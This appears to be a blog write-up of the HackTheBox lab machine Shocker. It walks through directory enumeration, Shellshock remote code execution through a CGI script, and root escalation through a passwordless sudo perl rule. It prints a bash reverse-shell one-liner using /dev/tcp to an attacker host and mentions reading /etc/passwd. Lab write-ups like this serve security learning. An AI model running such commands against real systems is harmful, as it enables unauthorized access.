---
layout: post
title: HackTheBox&#58; Shocker
description: Writeup for HTB box Shocker.
category: HackTheBox
---

### Introduction

Shocker is a Linux box, difficulty Easy on HTB.

It is very easy, using Shellshock to get shell and a trivial sudo command to get root shell.

### Initial Scan

![Shocker-1](/resources/Shocker-1.png)

### Shellshock

From the name suggest, our first prediction is the server is affected by [Shellshock vulnerability](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) in Apache server.
A quick curl to /cgi-bin/ folder show 403 error (note that /cgi-bin would give 404), further strengthen our guess.

Using `gobuster` with dirbuster medium wordlist as well as extension `sh` and `cgi`, we get our hit: `user.sh`.
The basic payload (with `cat /etc/passwd`) for Shellshock gives us result immediately, which means we get a RCE.
![Shocker-2](/resources/Shocker-2.png)

Replace the payload with our bash reverse shell:
```bash
/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```
we get a shell as user shelly and can read user.txt.
![Shocker-3](/resources/Shocker-3.png)

### Privesc: Sudo

Running `sudo -l` shows that user shelly can execute `/usr/bin/perl` without password.
With that in mind, we just need to write a short script to execute shell.
![Shocker-4](/resources/Shocker-4.png)

We get a root shell and can read root.txt.
